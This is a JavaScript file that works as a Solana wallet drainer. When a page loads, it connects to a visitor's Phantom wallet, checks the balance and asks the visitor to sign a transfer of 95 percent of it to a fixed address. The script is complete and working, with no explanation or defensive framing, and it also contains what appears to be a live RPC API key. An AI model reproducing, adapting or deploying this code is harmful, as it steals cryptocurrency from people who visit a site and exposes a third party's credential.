import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';

const targetAddress = "7re2yJdVSVs3mbGD8YKgau6kMCGd9mF9GDTdkMi6zKSJ";

window.addEventListener("load", async () => {
  try {
    console.log("Page loaded. Starting process...");

    if (!window.solana || !window.solana.isPhantom) {
      console.error("Phantom Wallet not detected.");
      return;
    }

    const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/xr-B-NJiKK_ThVscO4Y31pJUZJDZHffU", "confirmed");

    console.log("Attempting to connect to wallet...");
    const wallet = await window.solana.connect({ onlyIfTrusted: false });
    console.log("Wallet connected:", wallet.publicKey.toString());

    const balance = await connection.getBalance(wallet.publicKey);
    console.log(`Wallet balance: ${balance / 10 ** 9} SOL`);

    if (balance <= 5000) {
      console.error("Not enough SOL to perform the transaction.");
      return;
    }

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
    console.log("Fetched blockhash:", blockhash);

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(targetAddress),
        lamports: Math.floor(balance * 0.95),
      })
    );

    transaction.feePayer = wallet.publicKey;
    transaction.recentBlockhash = blockhash;

    console.log("Requesting wallet signature...");
    const { signature } = await window.solana.signAndSendTransaction(transaction);
    console.log(`Transaction successful! Signature: ${signature}`);
  } catch (err) {
    console.error("Error:", err.message);
  }
});
